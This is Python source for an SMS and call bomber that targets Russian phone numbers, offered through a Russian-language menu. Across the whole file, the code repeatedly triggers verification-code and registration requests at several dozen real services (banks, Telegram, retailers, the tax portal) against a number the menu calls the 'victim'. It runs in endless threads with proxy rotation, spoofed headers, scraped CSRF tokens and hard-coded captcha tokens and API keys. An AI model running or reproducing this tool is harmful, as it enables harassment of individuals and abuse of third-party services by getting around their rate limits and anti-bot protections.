import re
import os
from banner import banner
import requests
from bs4 import BeautifulSoup as Bs
from data import user_agent, email
import random
from time import sleep
from threading import Thread

http, https, phones_in_spam = [], [], []
proxy = {}


def default_headers() -> dict:
    return {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'Cache-Control': 'no-cache', 'Connection': 'keep-alive', 'User-Agent': user_agent()}


def post(link, headers=None, **kwargs):
    if headers == None:
        headers = default_headers()
    try:
        requests.post(link, headers=headers, timeout=5, **kwargs, proxies=proxies())
    except:
        pass


def get(link, headers=None, **kwargs):
    try:
        r = requests.get(link, headers=headers, timeout=5, **kwargs, proxies=proxies())
        return r
    except requests.exceptions.RequestException:
        pass


def put(link, headers=None, **kwargs):
    try:
        requests.put(link, headers=headers, timeout=5, **kwargs, proxies=proxies())
    except requests.exceptions.RequestException:
        pass


def phone_format(phone):
    formatted = [elem for elem in phone if elem.isdigit()]
    phone = ''
    for elem in formatted:
        phone += elem
    if phone[:1] == '8':
        return '7' + phone[1:]
    return phone


def pformat(phone: str, mask: str, mask_symbol: str = "*") -> str:
    formatted_phone: str = ""
    for symbol in mask:
        if symbol == mask_symbol:
            formatted_phone += phone[0]
            phone = phone[(len(phone) - 1) * -1:]
        else:
            formatted_phone += symbol
    return formatted_phone


class Bomber:
    def __init__(self, phone: str) -> None:
        requests.packages.urllib3.disable_warnings()
        self.phone = phone
        name = list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')
        self.password = "".join(random.choices(name, k=12))
        self.username = "".join(random.choices(name, k=12))
        self.name = "".join(random.choices(name, k=12))
        self.s = requests.Session()
        self.email = f'{self.name}@gmail.com'
        self.android_headers = {"X-Requested-With": "XMLHttpRequest", "Connection": "keep-alive", "Pragma": "no-cache",
                                "Cache-Control": "no-cache", "Accept-Encoding": "gzip, deflate, br",
                                'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36',
                                'DNT': '1'}

    def storeez(self):
        while self.phone in phones_in_spam:
            post('https://12storeez.com/user/send-sms-code-ajax', json={'phone': '+' + self.phone}, headers=default_headers())  # Может использоваться для mail
            sleep(30)

    def privetmir(self):
        while self.phone in phones_in_spam:
            post('https://api-user.privetmir.ru/api/v2/send-code', data={'checkApproves': 'Y', 'approve1': 'on', 'approve2': 'on', 'back_url': '', 'scope': 'register-user reset-password', 'login': pformat(self.phone, '+* (***) ***-**-**')}, headers=default_headers())
            sleep(60)

    def askona(self):
       while self.phone in phones_in_spam:
            get(f'https://www.askona.ru/api/registration/sendcode?csrf_token=c6318d07fe11be1ab54bf01527ceea4f&contact%5Bphone%5D={self.phone}', headers=default_headers())
            sleep(20)

    def pochtabank(self):
        while self.phone in phones_in_spam:
            try:
                session = requests.session()
                session.headers = default_headers()
                session.post('https://my.pochtabank.ru/dbo/registrationService/ib')
                session.put('https://my.pochtabank.ru/dbo/registrationService/ib/phoneNumber', json={"confirmation": "send", "phone": pformat(self.phone, '+* (***) ***-**-**')})
            except Exception:
                pass
            sleep(25)

    def xtra(self):
        while self.phone in phones_in_spam:
            for i in range(3):
                post('https://my.xtra.tv/api/signup?lang=uk', data={'phone': '+' + self.phone}, headers=default_headers())
                sleep(30)
            sleep(3600)

    def kazino888(self):
        while self.phone in phones_in_spam:
            for i in range(2):
                post('https://888-ru-api.prod.norway.everymatrix.com/v1/core/registration-tokens', json={'smsDestination': '+' + self.phone}, headers=default_headers())
                sleep(60)
            sleep(3600)

    def srochnodengi(self):
        while self.phone in phones_in_spam:
            for i in range(4):
                post('https://mapi-order.srochnodengi.ru/api/v1/auth/landing/send-sms/', data={'lead': None, 'phone': pformat(self.phone, '+* (***) *** - ** - **')}, headers=default_headers())
                sleep(180)
            sleep(3600)

    def quickresto(self):
        while self.phone in phones_in_spam:
            post('https://quickresto.ru/api_controller/?module=sms&method=sendRegistrationCode', json={'phone': '+' + self.phone}, headers=default_headers())
            sleep(60)

    def n1(self):
        while self.phone in phones_in_spam:
            post('https://tver.n1.ru/service/Users/register', json={"login": self.phone, "password": self.password, "domain": "tver.n1.ru", "type": "owner"})  # Может использоваться для mail
            sleep(300)

    def gloria(self):
        while self.phone in phones_in_spam:
            post('https://www.gloria-jeans.ru/phone-verification/send-code/registration', json={'phoneNumber': '+'+self.phone})
            post('https://www.gloria-jeans.ru/phone-verification/send-code-for-login', json={'phoneNumber': '+'+self.phone})
            sleep(30)

    def weely(self):
        while self.phone in phones_in_spam:
            post('https://api.wheely.com/v6/auth/oauth/token', json={'app_id': "54b5174d2cc1b37a50000001", 'phone': "+" + self.phone}, headers=default_headers())
            sleep(60)

    def ffriend(self):
        while self.phone in phones_in_spam:
            post('https://familyfriend.com/graphql', json={
                "query": "mutation AuthEnterPhoneMutation($input: RequestSignInCodeInput!) {\n  result: requestSignInCode(input: $input) {\n    ... on ErrorPayload {\n      message\n      __typename\n    }\n    ... on RequestSignInCodePayload {\n      codeLength\n      __typename\n    }\n    __typename\n  }\n}\n",
                "operationName": "AuthEnterPhoneMutation", "variables": {"input": {"phone": self.phone}}})
            sleep(60*60*24)

    def olenta(self):
        for i in range(2):
            post('https://online.lenta.com/api.php', data={'tel': pformat(self.phone, '+* (***) ***-**-**')}, headers=default_headers())
            sleep(60)

    def fivepost(self):
        while self.phone in phones_in_spam:
            post('https://api-omni.x5.ru/api/v1/clients-portal/auth/send-sms-code', json={'phoneNumber': '+' + self.phone}, headers={'Accept': 'application/json', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'Authorization': 'Bearer', 'Cache-Control': 'no-cache', 'Connection': 'keep-alive', 'Content-Length': '30', 'Content-Type': 'application/json', 'Host': 'api-omni.x5.ru', 'Origin': 'https://fivepost.ru', 'Pragma': 'no-cache', 'Referer': 'https://fivepost.ru/', 'sec-ch-ua': '"Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'User-Agent': user_agent(), 'X-Portal-Origin': 'https://fivepost.ru'})

    def tinkoff(self):
        while self.phone in phones_in_spam:
            for i in range(5):
                post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+" + self.phone}, headers=default_headers())
                sleep(60)
            sleep(3600)

    def lenta(self):
        while self.phone in phones_in_spam:
            for i in range(8):
                post('https://lenta.com/api/v1/registration/requestValidationCode', json={'phone': self.phone}, headers=default_headers())
                sleep(120)
            sleep(3600*13)

    def telegram(self):
        while self.phone in phones_in_spam:
            for i in range(5):
                post('https://my.telegram.org/auth/send_password', data={'phone': '+' + self.phone}, headers=default_headers())
                sleep(20)
            sleep(3600)

    def youla(self):
        while self.phone in phones_in_spam:
            post('https://youla.ru/web-api/auth/request_code', cookies={'tmr_lvid': '977a8377e5cce3f740a399c4a6ebafb0'}, json={'phone': self.phone}, headers={**{'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'Cache-Control': 'no-cache', 'Connection': 'keep-alive', 'Cookie': 'tmr_reqNum=69', 'Host': 'youla.ru', 'Pragma': 'no-cache', 'sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': user_agent()}, **{'X-Youla-Json': '{"lvid":"977a8377e5cce3f740a399c4a6ebafb0"}'}})
            sleep(60)

    def mcdonalds(self):
        while self.phone in phones_in_spam:
            post('https://site-api.mcdonalds.ru/api/v1/user/login/phone', json={"number": '+' + self.phone, "g-recaptcha-response": "03AGdBq24rQ30xdNbVMpOibIqu-cFMr5eQdEk5cghzJhxzYHbGRXKwwJbJx7HIBqh5scCXIqoSm403O5kv1DNSrh6EQhj_VKqgzZePMn7RJC3ndHE1u0AwdZjT3Wjta7ozISZ2bTBFMaaEFgyaYTVC3KwK8y5vvt5O3SSts4VOVDtBOPB9VSDz2G0b6lOdVGZ1jkUY5_D8MFnRotYclfk_bRanAqLZTVWj0JlRjDB2mc2jxRDm0nRKOlZoovM9eedLRHT4rW_v9uRFt34OF-2maqFsoPHUThLY3tuaZctr4qIa9JkfvfbVxE9IGhJ8P14BoBmq5ZsCpsnvH9VidrcMdDczYqvTa1FL5NbV9WX-gOEOudLhOK6_QxNfcAnoU3WA6jeP5KlYA-dy1YxrV32fCk9O063UZ-rP3mVzlK0kfXCK1atFsBgy2p4N7MlR77lDY9HybTWn5U9V"})
            sleep(60)

    def sushibox(self):
        while self.phone in phones_in_spam:
            post('https://sbguest.sushibox.org/api/v1/users/webauthorization?api_token=QsWwXIIoVl6F0Zm0cnjRWnvPkEUMqqx66QHBmk3qe0kD7p2RWXzPsgIn2DfN',json={'phone': self.phone})
            sleep(30)

    def pizzaboxru(self):
        while self.phone in phones_in_spam:
            post('https://pizzabox.ru/?action=auth', data={'CSRF': None, 'ACTION': 'REGISTER', 'MODE': 'PHONE', 'PHONE': pformat(self.phone, '+* (***) ***-**-**'), 'PASSWORD': self.password, 'PASSWORD2': self.password})
            sleep(60)

    def rollserv(self):
        for i in range(5):
            post('https://rollserv.ru/user/NewUser/?async=json', data={'type': '2', 'ext[2][1]': 'Иван', 'user[cellphone]': '+' + self.phone, 'user[i_agree]': 'on'}, headers=default_headers())
            sleep(60)
            post('https://rollserv.ru/user/RestorePwd/', data={'login': '+' + self.phone}, headers=default_headers())
            sleep(60)

    def nalog_ru(self):
        while self.phone in phones_in_spam:
            post('https://lkdr.nalog.ru/api/v1/auth/challenge/sms/start', json={'phone': self.phone}, headers=default_headers())
            sleep(120)

    def broniboy(self):
        while self.phone in phones_in_spam:
            try:
                token = Bs(self.s.get('https://broniboy.ru/moscow/').content, 'html.parser').select('meta[name=csrf-token]')[0]['content']
                self.s.post('https://broniboy.ru/ajax/send-sms', data={'phone': pformat(self.phone, '+* (***) ***-**-**'), '_csrf': token}, headers={'X-CSRF-Token': token, 'X-Requested-With': 'XMLHttpRequest'})
            except:
                pass
            sleep(30)

    def anti_sushi(self):
        while self.phone in phones_in_spam:
            try:
                result = str(Bs(self.s.get('https://anti-sushi.ru/', headers=default_headers()).content, 'html.parser').find_all(name='script')[3]).splitlines()[3].split('"')
                result.remove(result[0])
                result.remove(result[1])
                token = result[0]
                self.s.post('https://anti-sushi.ru/?auth', data={'CSRF': '', 'ACTION': 'REGISTER', 'Session': token, 'NAME': 'Иван', 'PHONE': self.phone[1:], 'EMAIL': self.email, 'PASSWORD': self.password, 'PASSWORD2': self.password, 'authactive': ''}, headers=default_headers())
            except:
                pass
            sleep(60)

    def b_apteka(self):
        while self.phone in phones_in_spam:
            try:
                self.s.get('https://b-apteka.ru/lk/login', headers=self.android_headers)
                self.s.post('https://b-apteka.ru/lk/send_confirm_code', json={'phone': self.phone}, cookies=self.s.cookies, headers=self.android_headers)
            except:
                pass
            sleep(60)

    def mtstv(self):
        while self.phone in phones_in_spam:
            post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", params={"msisdn": self.phone}, headers=default_headers())
            sleep(30)

    def citylink(self):
        while self.phone in phones_in_spam:
            for i in range(4):
                post(f'https://www.citilink.ru/registration/confirm/phone/+{self.phone}/', headers=default_headers())
                sleep(60)
            sleep(3600)

    def yandexeda(self):
        while self.phone in phones_in_spam:
            post('https://eda.yandex.ru/api/v1/user/request_authentication_code', json={'phone_number': '+' + self.phone}, headers=default_headers())
            sleep(60)

    def dodopizza(self):
        while self.phone in phones_in_spam:
            post('https://dodopizza.kz/api/sendconfirmationcode', data={'phoneNumber': self.phone}, headers=default_headers())
            sleep(60)

    def yota(self):
        while self.phone in phones_in_spam:
            try:
                post('https://bmp.tv.yota.ru/api/v10/auth/register/msisdn', json={'msisdn': self.phone, 'password': "123456"}, cookies=get('https://tv.yota.ru/').cookies)
            except Exception:
                pass
            sleep(60)

    def modulbank(self):
        while self.phone in phones_in_spam:
            post('https://my.modulbank.ru/api/v2/auth/phone', json={'Cellphone': self.phone[1:]}, headers=default_headers())
            sleep(60)

    def new_tel(self):
        for i in range(2):
            post('https://new-tel.net/ajax/a_api.php', params={'type': 'reg'}, data={'phone_nb': pformat(self.phone, '+* (***) ***-****'), 'phone_number': 'Хочу номер', 'token': '03AGdBq26wF9vypkRRBWWA2uEFxzuYUhrdmyPDZhexuQ1OfK5uC3Taz-57K9Xg3AzTfnqZ8Mh6S0LLB816L-o5fAzH75pq7ukCPCTmypRVtVOF9s3SY-E-KJJtfuPLm5SgovqUQB2XASVHcdb13UEiCmUK5nPeVZ-l3EfxbsPV1ClYcHJVds9p4plFO277bYF1Plsm85g_oeYiw9nJif0ehee7FiPHvqAzmTmjTiSNSrodGQt52qEBkLQt1Y8wfGVq2J-BlWYz4j8OBiy7I_1yXMy-UZLMj4JTtDAqJB8oubTMzxHRVGPgW-bd-y_0QgOaHUYNQ3HWmp0OZcOzLciK_IW7JRI_fRArRWdkVq62bfq-yYhP5dwz4y_EHdg4ZnRusGODw0jEmt9HMWA0EaTXVfanN2sa-oU0NM8ttRdWQmgSPKJtF3sJm0WdjzkHfjquORz82dCctbXz'}, headers={'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'ru,en;q=0.9', 'content-length': '494', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://new-tel.net', 'referer': 'https://new-tel.net/uslugi/call-password/', 'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.1.153 Yowser/2.5 Safari/537.36', 'x-requested-with': 'XMLHttpRequest'}, verify=False)
            sleep(30)

    def sunlight(self):
        while self.phone in phones_in_spam:
            for i in range(5):
                post('https://api.sunlight.net/v3/customers/authorization/', json={'phone': self.phone})
                sleep(60)

    def leran(self):
        while self.phone in phones_in_spam:
            post('https://www.leran.pro/user/sendCode/', data={'phone': pformat(self.phone, '+* (***) ***-**-**')})
            sleep(20)

    def uchi(self):
        while self.phone in phones_in_spam:
            post('https://uchi.ru/teens/gateway', json={"operationName": "StudentSignUp_UserSmsLoginRequest", "variables": {"phone": pformat(self.phone, "+* (***) ***-**-**"), "consent": True}, "query": "mutation StudentSignUp_UserSmsLoginRequest($phone: String!, $consent: Boolean) {\n  userSmsLoginRequest(input: {phone: $phone, type: student, consentUseData: $consent}) {\n    payload {\n      success\n      resendTimeout\n      __typename\n    }\n    __typename\n  }\n}\n"}) # Может использоватья для mail bomber
            sleep(30)

    def sro4nodengi(self):
        while self.phone in phones_in_spam:
            post('https://mapi-order.srochnodengi.ru/api/v1/auth/landing/send-sms/', data={'phone': pformat(self.phone, '+* (***) *** - ** - **'), 'lead': None})
            sleep(180)

    def askona(self):
        while self.phone in phones_in_spam:
            get(f'https://www.askona.ru/api/registration/sendcode?csrf_token=fd454c54c651805cbf6fb557fd4cefe0&contact%5Bphone%5D={self.phone}')
            sleep(20)

    def akbars(self):
        while self.phone in phones_in_spam:
            post('https://www.akbars.ru/api/PhoneConfirm/', json={'phoneNumber': self.phone[1:]})
            sleep(300)

    def uchi(self):
        while self.phone in phones_in_spam:
            post('https://uchi.ru/teens/gateway', json={"operationName": "StudentSignUp_UserSmsLoginRequest", "variables": {"phone": pformat(self.phone, "+* (***) ***-**-**"), "consent": True}, "query": "mutation StudentSignUp_UserSmsLoginRequest($phone: String!, $consent: Boolean) {\n  userSmsLoginRequest(input: {phone: $phone, type: student, consentUseData: $consent}) {\n    payload {\n      success\n      resendTimeout\n      __typename\n    }\n    __typename\n  }\n}\n"})
            sleep(30)

    def comfortkino(self):
        while self.phone in phones_in_spam:
            post('https://mgn.comfortkino.ru/local/php_interface/api/v1/user/login/', data={'phone': self.phone[1:]}, headers={'origin': 'https://mgn.comfortkino.ru', 'pragma': 'no-cache', 'referer': 'https://mgn.comfortkino.ru/login/', 'sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()})
            sleep(60)

    def noone(self):
        while self.phone in phones_in_spam:
            get(f'https://www.noone.ru/local/templates/noone_adaptive/partials/ajax/sms_check.php?phone=%252B{pformat(self.phone, "*(***)***-**-**")}&sessid=6339fc64b7999d645d74a23f3cdd184a', headers={'pragma': 'no-cache', 'referer': 'https://www.noone.ru/register/', 'sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent(), 'x-requested-with': 'XMLHttpRequest'})
            sleep(30)

    def yarus(self):
        while self.phone in phones_in_spam:
            get(f'https://api.yarus.ru/user/exist?phone=%2B{pformat(self.phone, "*(***)%20***-****")}', headers={**{'X-API-KEY': 'PELQTQN2mWfml8XVYsJwaB9Qi4t8XE', 'X-APP': '3', 'X-DEVICE-ID': '4cda50a904e35432a07252cbfad08c37'}, **default_headers()})
            sleep(60)

    def megadisk(self):
        while self.phone in phones_in_spam:
            get(f'https://disk.megafon.ru/api/3/msisdns/{self.phone}', headers={**{'Host': 'disk.megafon.ru', 'Referer': 'https://disk.megafon.ru/sso/confirm'}, **default_headers()})
            post('https://disk.megafon.ru/api/3/md_otp_tokens/', json={'phone': '+' + self.phone}, headers={**{'Host': 'disk.megafon.ru', 'Referer': 'https://disk.megafon.ru/sso/confirm'}, **default_headers()})
            sleep(60)

    def technopark(self):
        while self.phone in phones_in_spam:
             try:
                cookies = get('https://www.technopark.ru/', headers=default_headers()).cookies
                post('https://www.technopark.ru/graphql/', json={"operationName": "AuthStepOne", "variables": {"phone": self.phone[1:], "token": cookies['PHPSESSID'], "cityId": cookies['tp_city_id']}, "query": "mutation AuthStepOne($phone: String!, $token: String!, $cityId: ID!) @access(token: $token) @city(id: $cityId) {\n  sendOTP(phone: $phone)\n}\n"})
             except Exception:
                 pass

    def call(self):
        services = [self.new_tel]
        for function in services:
            Thread(target=function, daemon=False).start()
            sleep(30)

    def rus(self):
        services = [self.technopark, self.megadisk, self.technopark, self.yarus, self.noone, self.comfortkino, self.uchi, self.akbars, self.askona, self.srochnodengi, self.uchi, self.leran, self.sunlight, self.modulbank, self.yota, self.dodopizza, self.yandexeda, self.citylink, self.mtstv, self.b_apteka, self.anti_sushi, self.broniboy, self.nalog_ru, self.rollserv, self.pizzaboxru, self.sushibox, self.mcdonalds, self.youla, self.telegram, self.lenta, self.tinkoff, self.askona, self.olenta, self.ffriend, self.storeez, self.privetmir, self.pochtabank, self.xtra, self.kazino888, self.quickresto, self.n1, self.weely]
        for function in services:
            Thread(target=function, daemon=False).start()
            sleep(1.5)


def proxies():
    if http:
        proxy['HTTP'] = random.choice(http)
    if https:
        proxy['HTTPS'] = random.choice(https)
    return proxy


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def main():
    clear()
    print(banner)
    print(f'\n\n[1] Бомберы\n[2] Меню прокси\n[3] Информация\n[4] Контакты')
    task = input('')
    if task.isdigit():
        if task == '4':
            clear()
            print(banner)
            print(
                'Только для важных сообщений: t.me/DishonorDev\nИначе просто пошлю.')
            sleep(10)
            main()
        elif task == '3':
            clear()
            print(banner)
            print('Приятного разьеба :)')
            sleep(5)
            main()

        elif task == '2':
            clear()
            print(banner)
            print('[1] http Прокси\n[2] https прокси\n[0] Вернуться в меню')
            task = input('')
            if task.isdigit():
                if task == '0':
                    clear()
                    main()
                elif task == '1':
                    clear()
                    print(banner)
                    print('Введите прокси в формате 192.168.1.1:8080\nДля отмены введите 0')
                    proxy = input('')
                    if proxy == '0':
                        clear()
                        main()
                    else:
                        http.append('http://' + proxy)
                        clear()
                        print(banner)
                        print('Прокси успешно добавлен!')
                        sleep(3)
                        main()
                elif task == '2':
                    clear()
                    print(banner)
                    print('Введите прокси в формате 192.168.1.1:8080\nДля отмены введите 0')
                    proxy = input('')
                    if proxy == '0':
                        clear()
                        main()
                    else:
                        https.append('https://' + proxy)
                        clear()
                        print(banner)
                        print('Прокси успешно добавлен!')
                        sleep(3)
                        main()
            else:
                clear()
                print(banner)
                print('Я тебя не понял')
                sleep(3)
                main()
        elif task == '1':
            clear()
            print(banner)
            print('[1] SMS Bomber\n[2] Call Bomber\n[3] Остановить спам ')
            task = input('')
            if task.isdigit():
                if task == '3':
                    clear()
                    print(banner)
                    if phones_in_spam:
                        for phone in phones_in_spam:
                            print(f'Номер: {phone}')
                        print('\nДля остановки спама, введите номер телефона. Для отмены введите 0')
                        slot = input('')
                        if slot == '0':
                            main()
                        if slot.isdigit():
                            if slot in phones_in_spam:
                                phones_in_spam.remove(slot)
                                clear()
                                print(banner)
                                print('Спам на номер успешно остановлен!')
                                sleep(5)
                                main()
                            else:
                                clear()
                                print(banner)
                                print('Неверный номер!')
                                sleep(2)
                                main()
                    else:
                        print('Не запущенно ни одной сесси спама!')
                        sleep(2)
                        main()
                elif task == '2':
                    clear()
                    print(banner)
                    print('Внимание! Данный бомбер работает только на Российские номера!\n')
                    print('Введите номер. Для отмены 0')
                    phone = input('')
                    if phone == '0':
                        main()
                    else:
                        phone = phone_format(phone)
                        Thread(target=Bomber(phone).call, daemon=False).start()
                        phones_in_spam.append(phone)
                        print(f'Спам на номер {phone} начат.')
                        sleep(5)
                        main()
                elif task == '1':
                    clear()
                    print(banner)
                    print('Введите номер жертвы в любом формате. Для отмены введите 0')
                    phone = input('')
                    if phone == '0':
                        main()
                    else:
                        phone = phone_format(phone)
                        Thread(target=Bomber(phone).rus, daemon=False).start()
                        phones_in_spam.append(phone)
                        print(f'Спам на номер {phone} начат.')
                        sleep(5)
                        main()
                else:
                    clear()
                    print('Я тебя не понял')
                    sleep(5)
                    main()
            else:
                clear()
                print('Я тебя не понял')
                sleep(5)
                main()
        else:
            clear()
            print('Я тебя не понял')
            sleep(5)
            main()
    else:
        clear()
        print('Я тебя не понял')
        sleep(5)
        main()


if __name__ == '__main__':
    main()
